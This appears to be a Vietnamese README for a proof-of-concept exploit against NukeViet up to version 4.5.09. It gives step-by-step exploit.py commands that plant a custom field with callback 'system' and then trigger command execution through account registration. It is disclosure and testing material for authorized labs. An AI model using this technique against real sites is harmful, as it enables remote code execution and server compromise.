## 🚀 Cách sử dụng

> ⚠️ **Phạm vi ảnh hưởng:** Lỗ hổng hiện được xác nhận trên **NukeViet `<= 4.5.09`**.
> PoC này chỉ dành cho **môi trường Lab hoặc hệ thống được ủy quyền kiểm thử**.

### 🔎 Luồng kiểm thử

```text
┌──────────────────────┐
│  1. Đăng nhập Admin  │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 2. Tạo Custom Field  │
│   callback = system  │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 3. Đăng ký tài khoản  │
│  custom_field = id   │
└──────────┬───────────┘
           │
           ▼
┌──────────────────────┐
│ 4. Kiểm tra Response │
│      → RCE PoC       │
└──────────────────────┘
```

---

### ① 🔐 Đăng nhập Admin

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --user admin \
  --password 'MậtKhẩuAdmin'
```

* `--url` — URL NukeViet, mặc định `http://localhost:8080`
* `--user` — tài khoản Admin
* `--password` — mật khẩu Admin

Session được lưu vào `admin_session.cookies`.

---

### ② 🧩 Tạo Custom Field

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --test-field nv_poc_rce
```

* `--test-field` — tên Custom Field cần tạo.
* Script tự cấu hình field với `match_type=callback` và callback `system`.

---

### ③ 💥 Kích hoạt PoC

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --register \
  --reg-field 'nv_poc_rce=id'
```

Các tham số:

| Tham số       | Mô tả                               |
| ------------- | ----------------------------------- |
| `--register`  | Thực hiện đăng ký tài khoản test    |
| `--reg-field` | Custom Field theo dạng `NAME=VALUE` |
| `--reg-user`  | Username test, mặc định tự sinh     |
| `--reg-email` | Email test, mặc định tự sinh        |
| `--reg-pass`  | Mật khẩu test                       |
| `--config`    | Đường dẫn tới `config.php`          |

Ví dụ đầy đủ:

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --register \
  --reg-user pocuser01 \
  --reg-email pocuser01@example.com \
  --reg-pass 'Password123@!' \
  --reg-field 'nv_poc_rce=id'
```

---

### ④ 👤 Kiểm tra Session

```bash
python3 exploit.py \
  --url http://localhost:8080 \
  --whoami
```

Kiểm tra `admin_session.cookies` còn hiệu lực hay không.

---

### 📌 Lưu ý

* **Affected versions:** `NukeViet <= 4.5.09`
* PoC được thiết kế cho môi trường **Lab / Authorized Pentest**.

## 🎥 PoC Demo

> Video PoC được thực hiện trên môi trường Lab.

[▶️ Xem PoC Demo](./assets/poc-demo.webm)


